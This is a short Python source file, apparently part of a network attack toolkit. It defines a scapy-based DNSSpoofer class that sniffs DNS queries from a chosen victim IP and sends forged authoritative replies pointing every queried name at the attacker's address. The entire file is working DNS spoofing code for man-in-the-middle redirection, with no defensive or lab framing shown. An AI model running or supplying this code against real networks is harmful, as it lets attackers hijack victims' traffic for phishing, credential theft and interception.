from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from logger import log_info, log_warning

class DNSSpoofer:
    def __init__(self, interface, ip_attacker, ip_victim, ip_to_spoof):
        self.interface = interface
        self.ip_attacker = ip_attacker
        self.ip_victim = ip_victim
        self.ip_to_spoof = ip_to_spoof

    def spoof(self):
        log_info("Starting DNS spoofing")
        sniff(
            filter="udp and port 53",
            prn=self._on_dns_request,
            iface=self.interface,
            count=0,
        )
        log_warning("Stopping DNS spoofing")

    def _on_dns_request(self, packet):
        # Check that we received a DNS query. And check that the query comes from the victim.
        if (
            packet.haslayer(DNSQR)
            and packet[DNS].qr == 0
            and packet[IP].src == self.ip_victim
            # TODO: Only do this for packets related to ip_to_spoof
        ):
            log_info(
                "Received DNS query for {} from {}".format(
                    packet[DNSQR].qname, packet[IP].src
                )
            )
            # Construct the DNS response
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                / DNS(
                    id=packet[DNS].id,
                    qd=packet[DNS].qd,
                    aa=1,
                    qr=1,
                    an=DNSRR(rrname=packet[DNSQR].qname, rdata=self.ip_attacker),
                )
            )

            send(response, verbose=0)
            log_info("Sent DNS response for {} to {}".format(packet[DNSQR].qname, packet[IP].src))
        else:
            log_info("Ignoring packet from {}".format(packet[IP].src))